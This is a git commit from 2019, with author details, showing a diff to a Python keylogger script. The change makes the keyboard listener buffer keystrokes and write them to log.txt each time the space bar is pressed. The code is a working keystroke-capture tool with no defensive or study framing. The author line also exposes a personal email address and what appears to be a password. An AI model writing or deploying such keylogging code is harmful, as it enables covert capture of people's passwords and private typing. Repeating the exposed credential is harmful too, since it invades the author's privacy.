0b05eb7fe21cbcea45dc0c402db375879759c1cd
adriaan.van.der.valk@samskip.com <!Qazxswedcvfr>
2019-07-04 10:48:01 +0200

    updated the script

--- main.py
+++ main.py
@@ -4,8 +4,15 @@ import logging
 log_directory = r'log.txt'
 logging.basicConfig(filename=log_directory, level=logging.DEBUG)
 
+keys = []
+
 def on_press(key):
-    logging.info(str(key))
+    if key != Key.space:
+        keys.append(key)
+    else:
+        logging.info(str(keys))
+        keys.clear()
+        logging.info(str(key))
 
 with Listener(on_press = on_press) as listener:
     listener.join()
